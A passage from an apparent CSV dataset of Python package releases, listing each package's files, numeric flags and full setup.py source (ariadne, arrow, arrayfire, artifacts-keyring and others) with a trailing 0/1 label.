test_add_metalink_method[47].log test_add_metalink_method[48].log test_add_metalink_method[49].log test_add_metalink_method[4].log test_add_metalink_method[5].log test_add_metalink_method[6].log test_add_metalink_method[7].log test_add_metalink_method[8].log test_add_metalink_method[9].log test_add_torrent_method.log test_add_torrent_method[0].log test_add_torrent_method[10].log test_add_torrent_method[11].log test_add_torrent_method[12].log test_add_torrent_method[13].log test_add_torrent_method[14].log test_add_torrent_method[15].log test_add_torrent_method[16].log test_add_torrent_method[17].log test_add_torrent_method[18].log test_add_torrent_method[19].log test_add_torrent_method[1].log test_add_torrent_method[20].log test_add_torrent_method[21].log test_add_torrent_method[22].log test_add_torrent_method[23].log test_add_torrent_method[24].log test_add_torrent_method[25].log test_add_torrent_method[26].log test_add_torrent_method[27].log test_add_torrent_method[28].log test_add_torrent_method[29].log test_add_torrent_method[2].log test_add_torrent_method[30].log test_add_torrent_method[31].log test_add_torrent_method[32].log test_add_torrent_method[33].log test_add_torrent_method[34].log test_add_torrent_method[35].log test_add_torrent_method[36].log test_add_torrent_method[37].log test_add_torrent_method[38].log test_add_torrent_method[39].log test_add_torrent_method[3].log test_add_torrent_method[40].log test_add_torrent_method[41].log test_add_torrent_method[42].log test_add_torrent_method[43].log test_add_torrent_method[44].log test_add_torrent_method[45].log test_add_torrent_method[46].log test_add_torrent_method[47].log test_add_torrent_method[48].log test_add_torrent_method[49].log test_add_torrent_method[4].log test_add_torrent_method[5].log test_add_torrent_method[6].log test_add_torrent_method[7].log test_add_torrent_method[8].log test_add_torrent_method[9].log test_add_uri_method.log test_add_uri_method[0].log test_add_uri_method[10].log test_add_uri_method[11].log test_add_uri_method[12].log test_add_uri_method[13].log test_add_uri_method[14].log test_add_uri_method[15].log test_add_uri_method[16].log test_add_uri_method[17].log test_add_uri_method[18].log test_add_uri_method[19].log test_add_uri_method[1].log test_add_uri_method[20].log test_add_uri_method[21].log test_add_uri_method[22].log,,1
ariadne-0.15.1,0,1,1,1,1,0,1,0,asgi.py constants.py interfaces.py objects.py schema.py utils.py __init__.py apollotracing.py opentracing.py utils.py __init__.py __init__.py enums.py exceptions.py executable_schema.py extensions.py file_uploads.py format_error.py graphql.py interfaces.py load_schema.py logger.py objects.py py.typed resolvers.py scalars.py schema_visitor.py subscriptions.py types.py unions.py utils.py introspection_disabled.py query_cost.py __init__.py wsgi.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py,"#! /usr/bin/env python
import os
from setuptools import setup

CLASSIFIERS = [
    ""Development Status :: 4 - Beta"",
    ""Intended Audience :: Developers"",
    ""License :: OSI Approved :: BSD License"",
    ""Operating System :: OS Independent"",
    ""Programming Language :: Python"",
    ""Programming Language :: Python :: 3.7"",
    ""Programming Language :: Python :: 3.8"",
    ""Programming Language :: Python :: 3.9"",
    ""Programming Language :: Python :: 3.10"",
    ""Topic :: Software Development :: Libraries :: Python Modules"",
]

README_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), ""README.md"")
with open(README_PATH, ""r"", encoding=""utf8"") as f:
    README = f.read()

setup(
    name=""ariadne"",
    author=""Mirumee Software"",
    author_email=""hello@mirumee.com"",
    description=""Ariadne is a Python library for implementing GraphQL servers."",
    long_description=README,
    long_description_content_type=""text/markdown"",
    license=""BSD"",
    version=""0.15.1"",
    url=""https://github.com/mirumee/ariadne"",
    packages=[""ariadne""],
    include_package_data=True,
    install_requires=[
        ""graphql-core>=3.2.0,<3.3"",
        ""starlette>0.17<0.20"",
        ""typing_extensions>=3.6.0"",
    ],
    extras_require={""asgi-file-uploads"": [""python-multipart>=0.0.5""]},
    classifiers=CLASSIFIERS,
    platforms=[""any""],
    zip_safe=False,
)
",1
arnparse-0.0.2,1,1,1,1,1,0,0,0,arnparse.py str_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"from distutils.core import setup
import setuptools  # required for running `python setup.py bdist_wheel`

from codecs import open
from os import path

here = path.abspath(path.dirname(__file__))

# Get the long description from the README file
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='arnparse',
    packages=['arnparse'],  # this must be the same as the name above
    version='0.0.2',
    description='Parse ARNs using Python',
    long_description=long_description,
    long_description_content_type='text/markdown',
    author='Simon-Pierre Gingras',
    author_email='spgingras@poka.io',
    url='https://github.com/PokaInc/arnparse',  # use the URL to the github repo
    download_url='https://github.com/PokaInc/arnparse/tarball/0.0.1',
    keywords=['aws', 'arn', 'parse'],  # arbitrary keywords
    install_requires=[],
    classifiers=[],
)
",1
Arpeggio-2.0.0,0,1,1,1,1,0,0,0,.editorconfig .gitattributes ci-linux-ubuntu.yml .gitignore cleanpeg.py export.py peg.py test_issue_16.py __init__.py test_issue_20.py __init__.py grammar1.peg grammar2.peg test_issue_22.py __init__.py test_issue_26.py __init__.py test_issue_31.py __init__.py test_issue_32.py __init__.py test_issue43.py __init__.py test_issue_61.py test_issue_73.py test_direct_rule_call.py test_memoization.py __init__.py test_decorator_combine.py test_default_semantic_action.py test_eolterm.py test_error_reporting.py test_examples.py test_exporter.py test_flags.py test_parser_params.py test_parser_resilience.py test_parsing_expressions.py test_pathologic_models.py test_peg_parser.py test_position.py test_ptnode_navigation_expressions.py test_python_parser.py test_reduce_tree.py test_semantic_action_results.py test_separators.py test_sequence_params.py test_suppression.py test_unicode.py test_visitor.py __init__.py utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt arpeggio-logo.png arpeggio-logo.svg AUTHORS.md CHANGELOG.md CONTRIBUTING.md contributing.md discuss.md license.md configuration.md version-select.css debugging.md extra.css getting_started.md grammars.md handling_errors.md arpeggio-logo.svg calc_parser_model.dot.png calc_parse_tree.dot.png calc_parse_tree_reduced.dot.png csvfile_parse_tree.dot.png index.md version-select.js parse_trees.md semantics.md troubleshooting.md bibtex.md calc.md csv.md bibtex.py bibtex_example.bib README.md calc.peg calc.py calc_clean.peg calc_cleanpeg.py calc_peg.py README.md __init__.py csv.peg csv.py csv_peg.py README.md test_data.csv __init__.py json.py README.md test.json peg.peg peg_peg.py README.md README.md program.rbt README.md robot.peg robot.py robot_peg.py program.simple README.md simple.py __init__.py install-dev.sh install-test.sh LICENSE mkdocs.yml grammar.py py2_memory_report_memoization.txt py2_memory_report_nomemoization.txt py2_speed_report.txt py3_memory_report_memoization.txt py3_memory_report_nomemoization.txt py3_speed_report.txt _speed_report.txt requirements.txt run_all_py2.sh run_all_py3.sh run_memory.sh run_speed.sh LightSwitch.rpy LightSwitchDouble.rpy test_memory_memoization.py test_memory_nomemoization.py test_speed.py PKG-INFO PULL_REQUEST_TEMPLATE.md README.md runtests.sh setup.cfg setup.py THANKS.md,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
###############################################################################
# Name: arpeggio.py
# Purpose: PEG parser interpreter
# Author: Igor R. Dejanović <igor DOT dejanovic AT gmail DOT com>
# Copyright: (c) Igor R. Dejanović <igor DOT dejanovic AT gmail DOT com>
# License: MIT License
#
# Arpeggio is an implementation of packrat parser interpreter based on PEG
# grammars.
# Parsers are defined using python language construction or PEG language.
###############################################################################

from io import open
import os
import sys
from setuptools import setup

VERSIONFILE = ""arpeggio/__init__.py""
VERSION = None
for line in open(VERSIONFILE, ""r"", encoding='utf8').readlines():
    if line.startswith('__version__'):
        VERSION = line.split('""')[1]

if not VERSION:
    raise RuntimeError('No version defined in arpeggio/__init__.py')

if sys.argv[-1].startswith('publish'):
    if os.system(""pip list | grep wheel""):
        print(""wheel not installed.\nUse `pip install wheel`.\nExiting."")
        sys.exit()
    if os.system(""pip list | grep twine""):
        print(""twine not installed.\nUse `pip install twine`.\nExiting."")
        sys.exit()
    os.system(""python setup.py sdist bdist_wheel"")
    if sys.argv[-1] == 'publishtest':
        os.system(""twine upload -r test dist/*"")
    else:
        os.system(""twine upload dist/*"")
        print(""You probably want to also tag the version now:"")
        print(""  git tag -a {0} -m 'version {0}'"".format(VERSION))
        print(""  git push --tags"")
    sys.exit()

setup(version=VERSION)
",1
arrayfire-3.8.0,0,1,1,1,0,0,0,0,algorithm.py arith.py array.py base.py bcast.py blas.py cuda.py data.py device.py features.py graphics.py image.py index.py interop.py lapack.py library.py ml.py opencl.py random.py signal.py sparse.py statistics.py timer.py util.py vision.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md arrayfire.algorithm.rst arrayfire.arith.rst arrayfire.array.rst arrayfire.base.rst arrayfire.bcast.rst arrayfire.blas.rst arrayfire.cuda.rst arrayfire.data.rst arrayfire.device.rst arrayfire.features.rst arrayfire.graphics.rst arrayfire.image.rst arrayfire.index.rst arrayfire.interop.rst arrayfire.lapack.rst arrayfire.library.rst arrayfire.ml.rst arrayfire.opencl.rst arrayfire.random.rst arrayfire.rst arrayfire.signal.rst arrayfire.sparse.rst arrayfire.statistics.rst arrayfire.timer.rst arrayfire.util.rst arrayfire.vision.rst arrayfire_logo_symbol.png conf.py index.rst make.bat Makefile modules.rst style.css page.html bench_blas.py bench_cg.py bench_fft.py monte_carlo_pi.py idxio.py fast.py harris.py matching.py susan.py black_scholes_options.py heston_model.py monte_carlo_options.py convolve.py intro.py conway.py fractal.py histogram.py plot2d.py plot3.py surface.py helloworld.py logistic_regression.py mnist_common.py LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py,"#!/usr/bin/env python

#######################################################
# Copyright (c) 2015, ArrayFire
# All rights reserved.
#
# This file is distributed under 3-clause BSD license.
# The complete license agreement can be obtained at:
# http://arrayfire.com/licenses/BSD-3-Clause
########################################################

import os
import re

# package can be distributed with arrayfire binaries or
# just with python wrapper files, the AF_BUILD_LOCAL
# environment var determines whether to build the arrayfire
# binaries locally rather than searching in a system install

AF_BUILD_LOCAL_LIBS = os.environ.get('AF_BUILD_LOCAL_LIBS')
print(f'AF_BUILD_LOCAL_LIBS={AF_BUILD_LOCAL_LIBS}')
if AF_BUILD_LOCAL_LIBS:
    print('Proceeding to build ArrayFire libraries')
else:
    print('Skipping binaries installation, only python files will be installed')

AF_BUILD_CPU = os.environ.get('AF_BUILD_CPU')
AF_BUILD_CPU = 1 if AF_BUILD_CPU is None else int(AF_BUILD_CPU)
AF_BUILD_CPU_CMAKE_STR = '-DAF_BUILD_CPU:BOOL=ON' if (AF_BUILD_CPU == 1) else '-DAF_BUILD_CPU:BOOL=OFF'

AF_BUILD_CUDA = os.environ.get('AF_BUILD_CUDA')
AF_BUILD_CUDA = 1 if AF_BUILD_CUDA is None else int(AF_BUILD_CUDA)
AF_BUILD_CUDA_CMAKE_STR = '-DAF_BUILD_CUDA:BOOL=ON' if (AF_BUILD_CUDA == 1) else '-DAF_BUILD_CUDA:BOOL=OFF'

AF_BUILD_OPENCL = os.environ.get('AF_BUILD_OPENCL')
AF_BUILD_OPENCL = 1 if AF_BUILD_OPENCL is None else int(AF_BUILD_OPENCL)
AF_BUILD_OPENCL_CMAKE_STR = '-DAF_BUILD_OPENCL:BOOL=ON' if (AF_BUILD_OPENCL == 1) else '-DAF_BUILD_OPENCL:BOOL=OFF'

AF_BUILD_UNIFIED = os.environ.get('AF_BUILD_UNIFIED')
AF_BUILD_UNIFIED = 1 if AF_BUILD_UNIFIED is None else int(AF_BUILD_UNIFIED)
AF_BUILD_UNIFIED_CMAKE_STR = '-DAF_BUILD_UNIFIED:BOOL=ON' if (AF_BUILD_UNIFIED == 1) else '-DAF_BUILD_UNIFIED:BOOL=OFF'

if AF_BUILD_LOCAL_LIBS:
    # invoke cmake and build arrayfire libraries to install locally in package
    from skbuild import setup

    def filter_af_files(cmake_manifest):
        cmake_manifest = list(filter(lambda name: not (name.endswith('.h') 
            or name.endswith('.cpp')
            or name.endswith('.hpp')
            or name.endswith('.cmake')
            or name.endswith('jpg')
            or name.endswith('png')
            or name.endswith('libaf.so') #avoids duplicates due to symlinks
            or re.match('.*libaf\.so\.3\..*', name) is not None
            or name.endswith('libafcpu.so')
            or re.match('.*libafcpu\.so\.3\..*', name) is not None
            or name.endswith('libafcuda.so')
            or re.match('.*libafcuda\.so\.3\..*', name) is not None
            or name.endswith('libafopencl.so')
            or re.match('.*libafopencl\.so\.3\..*', name) is not None
            or name.endswith('libforge.so')
            or re.match('.*libforge\.so\.1\..*', name) is not None
            or 'examples' in name), cmake_manifest))
        return cmake_manifest

    print('Building CMAKE with following configurable variables: ')
    print(AF_BUILD_CPU_CMAKE_STR)
    print(AF_BUILD_CUDA_CMAKE_STR)
    print(AF_BUILD_OPENCL_CMAKE_STR)
    print(AF_BUILD_UNIFIED_CMAKE_STR)


    setup(
        packages=['arrayfire'],
        cmake_install_dir='',
        cmake_process_manifest_hook=filter_af_files,
        include_package_data=False,
        cmake_args=[AF_BUILD_CPU_CMAKE_STR,
                    AF_BUILD_CUDA_CMAKE_STR,
                    AF_BUILD_OPENCL_CMAKE_STR,
                    AF_BUILD_UNIFIED_CMAKE_STR,
                    # todo: pass additional args from environ
                    '-DCMAKE_BUILD_TYPE:STRING=""RelWithDebInfo""',
                    '-DFG_USE_STATIC_CPPFLAGS:BOOL=OFF',
                    '-DFG_WITH_FREEIMAGE:BOOL=OFF',
                    '-DCUDA_architecture_build_targets:STRING=All', 
                    '-DAF_BUILD_DOCS:BOOL=OFF',
                    '-DAF_BUILD_EXAMPLES:BOOL=OFF',
                    '-DAF_INSTALL_STANDALONE:BOOL=ON',
                    '-DAF_WITH_IMAGEIO:BOOL=ON',
                    '-DAF_WITH_LOGGING:BOOL=ON',
                    '-DBUILD_TESTING:BOOL=OFF',
                    '-DAF_BUILD_FORGE:BOOL=ON',
                    '-DAF_INSTALL_LIB_DIR:STRING=arrayfire',
                    '-DAF_INSTALL_BIN_DIR:STRING=arrayfire',
                    '-DFG_INSTALL_LIB_DIR:STRING=arrayfire',
                    '-DAF_WITH_STATIC_MKL=ON',
                    ]
    )

else:
    # ignores local arrayfire libraries, will search system instead
    from setuptools import setup
    setup()

",0
arrow-1.2.2,0,1,1,1,0,0,0,0,api.py arrow.py constants.py factory.py formatter.py locales.py parser.py py.typed util.py _version.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.rst conf.py index.rst make.bat Makefile releases.rst LICENSE Makefile MANIFEST.in PKG-INFO README.rst requirements-docs.txt requirements-tests.txt requirements.txt setup.cfg setup.py conftest.py test_api.py test_arrow.py test_factory.py test_formatter.py test_locales.py test_parser.py test_util.py utils.py __init__.py tox.ini,"# mypy: ignore-errors
from pathlib import Path

from setuptools import setup

readme = Path(""README.rst"").read_text(encoding=""utf-8"")
version = Path(""arrow/_version.py"").read_text(encoding=""utf-8"")
about = {}
exec(version, about)

setup(
    name=""arrow"",
    version=about[""__version__""],
    description=""Better dates & times for Python"",
    long_description=readme,
    long_description_content_type=""text/x-rst"",
    url=""https://arrow.readthedocs.io"",
    author=""Chris Smith"",
    author_email=""crsmithdev@gmail.com"",
    license=""Apache 2.0"",
    packages=[""arrow""],
    package_data={""arrow"": [""py.typed""]},
    zip_safe=False,
    python_requires="">=3.6"",
    install_requires=[
        ""python-dateutil>=2.7.0"",
        ""typing_extensions; python_version<'3.8'"",
    ],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
    ],
    keywords=""arrow date time datetime timestamp timezone humanize"",
    project_urls={
        ""Repository"": ""https://github.com/arrow-py/arrow"",
        ""Bug Reports"": ""https://github.com/arrow-py/arrow/issues"",
        ""Documentation"": ""https://arrow.readthedocs.io"",
    },
)
",1
art-5.7,0,1,1,1,1,0,0,0,art.py art_dic.py art_param.py decor_dic.py test.py test2.py text_dic1.py text_dic2.py text_dic3.py __init__.py __main__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt ArtList.ipynb AUTHORS.md CHANGELOG.md codecov.yml DecorList.ipynb dev-requirements.txt FontList.ipynb INSTALL.md LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"# -*- coding: utf-8 -*-
""""""Setup module.""""""
try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup


MINIMAL_DESCRIPTION = '''ASCII art is also known as ""computer text art"".
    It involves the smart placement of typed special characters or
    letters to make a visual shape that is spread over multiple lines of text.
    ART is a Python lib for text converting to ASCII art fancy.'''


def get_dev_requires():
    """"""Read dev-requirements.txt.""""""
    requirements = open(""dev-requirements.txt"", ""r"").read()
    return list(filter(lambda x: x != """", requirements.split()))


def read_description():
    """"""Read README.md and CHANGELOG.md.""""""
    try:
        with open(""README.md"") as r:
            description = ""\n""
            description += r.read()
        with open(""CHANGELOG.md"") as c:
            description += ""\n""
            description += c.read()
        return description
    except Exception:
        return MINIMAL_DESCRIPTION


setup(
    name='art',
    packages=['art'],
    version='5.7',
    description='ASCII Art Library For Python',
    long_description=read_description(),
    long_description_content_type='text/markdown',
    author='Sepand Haghighi',
    author_email='info@4r7.ir',
    url='https://github.com/sepandhaghighi/art',
    keywords=""ascii art python3 python text font non-ascii printing"",
    project_urls={
        'Webpage': 'https://www.4r7.ir',
        'Source': 'https://github.com/sepandhaghighi/art',
        'Tracker': 'https://github.com/sepandhaghighi/art/issues',
        'Discord': 'https://discord.com/invite/FAAyq3QJqP',
    },
    install_requires=[],
    extras_require={
        ""dev"": get_dev_requires()
    },
    python_requires='>=2.7',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Intended Audience :: Education',
        'Intended Audience :: End Users/Desktop',
        'Intended Audience :: Science/Research',
        'Natural Language :: English',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Topic :: Text Processing :: Fonts',
        'Topic :: Text Editors',
        'Topic :: Text Processing :: General',
        'Topic :: Utilities',
        'Topic :: Multimedia',
        'Topic :: Printing',
    ],
    license='MIT',
    include_package_data=True
)
",1
artifactory-0.1.17,0,1,1,1,0,0,0,0,dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt artifactory.py MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python

import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# PyPi RST variant doesn't understand the 'code' tag. so replacing it
# with a regular quote
def rst_strip_code_tag(string):
    return re.sub('^\\.\\. code:: .*', '::', string, flags=re.MULTILINE)

# Utility function to read the README file.
# To upload to PyPi, you need to have 'pypandoc'.
# Otherwise the readme will be clumsy.
try:
    from pypandoc import convert
    read_md = lambda fname: rst_strip_code_tag(
        convert(os.path.join(os.path.dirname(__file__), fname), 'rst'))
except ImportError:
    print(""warning: pypandoc module not found,"" +
          "" could not convert Markdown to RST"")
    read_md = lambda fname: open(os.path.join(os.path.dirname(__file__),
                                              fname), 'r').read()

setup(
    name='artifactory',
    version='0.1.17',
    py_modules=['artifactory'],
    license='MIT License',
    description='A Python to Artifactory interface',
    long_description=read_md('README.md'),
    author='Konstantin Nazarov',
    author_email='knazarov@parallels.com',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Topic :: Software Development :: Libraries',
        'Topic :: System :: Filesystems',
    ],
    url='http://github.com/parallels/artifactory',
    download_url='http://github.com/parallels/artifactory',
    install_requires=['pathlib', 'requests', 'python-dateutil'],
    zip_safe=False,
    package_data={'': ['README.md']}
)
",1
artifacts-keyring-0.3.2,0,1,1,0,1,0,0,0,LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py plugin.py EULA_Microsoft Visual Studio Team Services Credential Provider.docx LICENSE CredentialProvider.Microsoft.deps.json CredentialProvider.Microsoft.dll CredentialProvider.Microsoft.pdb CredentialProvider.Microsoft.runtimeconfig.json Microsoft.IdentityModel.Clients.ActiveDirectory.dll Newtonsoft.Json.dll NuGet.Common.dll NuGet.Configuration.dll NuGet.Frameworks.dll NuGet.Packaging.dll NuGet.Protocol.dll NuGet.Versioning.dll PowerArgs.dll System.Security.Cryptography.ProtectedData.dll System.Security.Cryptography.ProtectedData.dll CredentialProvider.Microsoft.exe CredentialProvider.Microsoft.exe.config CredentialProvider.Microsoft.pdb MicroBuild.Signing.dll Microsoft.IdentityModel.Clients.ActiveDirectory.dll Microsoft.Win32.Primitives.dll netstandard.dll Newtonsoft.Json.dll NuGet.Common.dll NuGet.Configuration.dll NuGet.Frameworks.dll NuGet.Packaging.dll NuGet.Protocol.dll NuGet.Versioning.dll PowerArgs.dll System.AppContext.dll System.Collections.Concurrent.dll System.Collections.dll System.Collections.NonGeneric.dll System.Collections.Specialized.dll System.ComponentModel.dll System.ComponentModel.EventBasedAsync.dll System.ComponentModel.Primitives.dll System.ComponentModel.TypeConverter.dll System.Console.dll System.Data.Common.dll System.Diagnostics.Contracts.dll System.Diagnostics.Debug.dll System.Diagnostics.FileVersionInfo.dll System.Diagnostics.Process.dll System.Diagnostics.StackTrace.dll System.Diagnostics.TextWriterTraceListener.dll System.Diagnostics.Tools.dll System.Diagnostics.TraceSource.dll System.Diagnostics.Tracing.dll System.Drawing.Primitives.dll System.Dynamic.Runtime.dll System.Globalization.Calendars.dll System.Globalization.dll System.Globalization.Extensions.dll System.IO.Compression.dll System.IO.Compression.ZipFile.dll System.IO.dll System.IO.FileSystem.dll System.IO.FileSystem.DriveInfo.dll System.IO.FileSystem.Primitives.dll System.IO.FileSystem.Watcher.dll System.IO.IsolatedStorage.dll System.IO.MemoryMappedFiles.dll System.IO.Pipes.dll System.IO.UnmanagedMemoryStream.dll System.Linq.dll System.Linq.Expressions.dll System.Linq.Parallel.dll System.Linq.Queryable.dll System.Net.Http.dll System.Net.NameResolution.dll System.Net.NetworkInformation.dll System.Net.Ping.dll System.Net.Primitives.dll System.Net.Requests.dll System.Net.Security.dll System.Net.Sockets.dll System.Net.WebHeaderCollection.dll System.Net.WebSockets.Client.dll System.Net.WebSockets.dll System.ObjectModel.dll System.Reflection.dll System.Reflection.Extensions.dll System.Reflection.Primitives.dll System.Resources.Reader.dll System.Resources.ResourceManager.dll System.Resources.Writer.dll System.Runtime.CompilerServices.VisualC.dll System.Runtime.dll System.Runtime.Extensions.dll System.Runtime.Handles.dll System.Runtime.InteropServices.dll System.Runtime.InteropServices.RuntimeInformation.dll System.Runtime.Numerics.dll System.Runtime.Serialization.Formatters.dll System.Runtime.Serialization.Json.dll System.Runtime.Serialization.Primitives.dll System.Runtime.Serialization.Xml.dll System.Security.Claims.dll System.Security.Cryptography.Algorithms.dll System.Security.Cryptography.Csp.dll System.Security.Cryptography.Encoding.dll System.Security.Cryptography.Primitives.dll System.Security.Cryptography.ProtectedData.dll System.Security.Cryptography.X509Certificates.dll System.Security.Principal.dll System.Security.SecureString.dll System.Text.Encoding.dll System.Text.Encoding.Extensions.dll System.Text.RegularExpressions.dll System.Threading.dll System.Threading.Overlapped.dll System.Threading.Tasks.dll System.Threading.Tasks.Parallel.dll System.Threading.Thread.dll System.Threading.ThreadPool.dll System.Threading.Timer.dll System.ValueTuple.dll System.Xml.ReaderWriter.dll System.Xml.XDocument.dll System.Xml.XmlDocument.dll System.Xml.XmlSerializer.dll System.Xml.XPath.dll System.Xml.XPath.XDocument.dll ThirdPartyNotices.txt support.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt test_backend.py __init__.py,"#!/usr/bin/env python3

# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------

import os
import re
import setuptools
import shutil
import sys
import tarfile
import tempfile
import urllib.request

CREDENTIAL_PROVIDER = (
    ""https://github.com/Microsoft/artifacts-credprovider/releases/download/""
    + ""v0.1.22""
    + ""/Microsoft.NuGet.CredentialProvider.tar.gz""
)


def download_credential_provider(root):
    dest = os.path.join(root, ""src"", ""artifacts_keyring"", ""plugins"")

    if not os.path.isdir(dest):
        os.makedirs(dest)

    print(""Downloading and extracting to"", dest)
    with urllib.request.urlopen(CREDENTIAL_PROVIDER) as fileobj:
        tar = tarfile.open(mode=""r|gz"", fileobj=fileobj)
        tar.extractall(dest)


def get_version(root):
    src = os.path.join(root, ""src"", ""artifacts_keyring"", ""__init__.py"")

    with open(src, ""r"", encoding=""utf-8"", errors=""strict"") as f:
        txt = f.read()

    m = re.search(r""__version__\s*=\s*['\""](.+?)['\""]"", txt)

    version = os.environ.get(""BUILD_BUILDNUMBER"")
    if not version:
        return m.group(1) if m else ""0.1.0""

    txt = re.sub(
        r""__version__\s*=\s*['\""](.+?)['\""]"",
        '__version__ = ""{}""'.format(version),
        txt,
    )

    with open(src, ""w"", encoding=""utf-8"") as f:
        print(txt, end="""", file=f)

    return version


if __name__ == ""__main__"":
    root = os.path.dirname(os.path.abspath(__file__))
    download_credential_provider(root)
    setuptools.setup(version=get_version(root))
",0
arviz-0.12.1,0,1,1,0,0,0,1,0,base.py converters.py datasets.py inference_data.py io_cmdstan.py io_cmdstanpy.py io_dict.py io_emcee.py io_json.py io_netcdf.py io_numpyro.py io_pyjags.py io_pymc3.py io_pymc3_3x.py io_pyro.py io_pystan.py utils.py centered_eight.nc non_centered_eight.nc __init__.py labels.py autocorrplot.py autocorrplot.py bpvplot.py compareplot.py densityplot.py distcomparisonplot.py distplot.py dotplot.py ecdfplot.py elpdplot.py energyplot.py essplot.py forestplot.py hdiplot.py kdeplot.py khatplot.py lmplot.py loopitplot.py mcseplot.py pairplot.py parallelplot.py posteriorplot.py ppcplot.py rankplot.py separationplot.py traceplot.py violinplot.py __init__.py autocorrplot.py bpvplot.py compareplot.py densityplot.py distcomparisonplot.py distplot.py dotplot.py ecdfplot.py elpdplot.py energyplot.py essplot.py forestplot.py hdiplot.py kdeplot.py khatplot.py lmplot.py loopitplot.py mcseplot.py pairplot.py parallelplot.py posteriorplot.py ppcplot.py rankplot.py separationplot.py traceplot.py tsplot.py violinplot.py __init__.py __init__.py bpvplot.py compareplot.py densityplot.py distcomparisonplot.py distplot.py dotplot.py ecdfplot.py elpdplot.py energyplot.py essplot.py forestplot.py hdiplot.py kdeplot.py khatplot.py lmplot.py loopitplot.py mcseplot.py pairplot.py parallelplot.py plot_utils.py posteriorplot.py ppcplot.py rankplot.py separationplot.py arviz-bluish.mplstyle arviz-brownish.mplstyle arviz-colors.mplstyle arviz-cyanish.mplstyle arviz-darkgrid.mplstyle arviz-grayscale.mplstyle arviz-greenish.mplstyle arviz-orangish.mplstyle arviz-plasmish.mplstyle arviz-purplish.mplstyle arviz-redish.mplstyle arviz-royish.mplstyle arviz-viridish.mplstyle arviz-white.mplstyle arviz-whitegrid.mplstyle traceplot.py tsplot.py violinplot.py __init__.py py.typed rcparams.py sel_utils.py style.css icons-svg-inline.html density_utils.py diagnostics.py stats.py stats_refitting.py stats_utils.py __init__.py test_data.py test_data_zarr.py test_diagnostics.py test_diagnostics_numba.py test_helpers.py test_plots_bokeh.py test_plots_matplotlib.py test_plot_utils.py test_rcparams.py test_stats.py test_stats_numba.py test_stats_utils.py test_utils.py test_utils_numba.py __init__.py conftest.py test_data_cmdstan.py test_data_cmdstanpy.py test_data_emcee.py test_data_numpyro.py test_data_pyjags.py test_data_pymc.py test_data_pyro.py test_data_pystan.py __init__.py helpers.py __init__.py utils.py base.py wrap_stan.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md GOVERNANCE.md LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md requirements-dev.txt requirements-docs.txt requirements-external.txt requirements-optional.txt requirements.txt setup.cfg setup.py,"import codecs
import os
import re

import setuptools
from setuptools import find_packages, setup
from setuptools.command.develop import develop
from setuptools.command.install import install

PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
REQUIREMENTS_FILE = os.path.join(PROJECT_ROOT, ""requirements.txt"")
REQUIREMENTS_OPTIONAL_FILE = os.path.join(PROJECT_ROOT, ""requirements-optional.txt"")
REQUIREMENTS_DEV_FILE = os.path.join(PROJECT_ROOT, ""requirements-dev.txt"")
README_FILE = os.path.join(PROJECT_ROOT, ""README.md"")
VERSION_FILE = os.path.join(PROJECT_ROOT, ""arviz"", ""__init__.py"")


def get_requirements():
    with codecs.open(REQUIREMENTS_FILE) as buff:
        return buff.read().splitlines()


def get_requirements_dev():
    with codecs.open(REQUIREMENTS_DEV_FILE) as buff:
        return buff.read().splitlines()


def get_requirements_optional():
    with codecs.open(REQUIREMENTS_OPTIONAL_FILE) as buff:
        return buff.read().splitlines()


def get_long_description():
    with codecs.open(README_FILE, ""rt"") as buff:
        return buff.read()


def get_version():
    lines = open(VERSION_FILE, ""rt"").readlines()
